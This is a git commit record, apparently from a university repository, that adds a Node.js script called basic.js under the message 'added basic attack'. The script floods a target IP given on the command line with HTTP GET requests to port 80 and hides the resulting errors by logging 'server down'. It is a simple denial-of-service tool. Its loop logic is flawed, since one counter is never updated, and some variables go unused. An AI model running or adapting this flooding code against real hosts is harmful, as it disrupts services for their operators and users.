550cecba08dda9f7d70642343f462187e5dddf94
Dean Chen <dean.chen@duke.edu>
2012-04-22 20:30:59 -0400

    added basic attack

---
+++ basic.js
@@ -0,0 +1,40 @@
+var http = require('http');
+
+var args = process.argv.splice(2);
+var ip = args[0];
+var worker = args[1]; 
+
+process.on('uncaughtException', function(exception) {console.log(new Date(), "server down")});
+
+  var c, http, i, options, query, s, send;
+
+  http = require('http');
+
+  options = {
+    host: ip,
+    port: 80,
+    path: '/'
+  };
+
+  s = 0;
+  c = 0;
+
+  query = function() {
+    options.path = "/";
+    s++;
+    return http.get(options);
+  };
+
+  i = 0;
+
+  send = function() {
+    while (true) {
+      if (s - c > 10000) {
+        break;
+      }
+      query();
+    }
+  };
+
+  send();
+
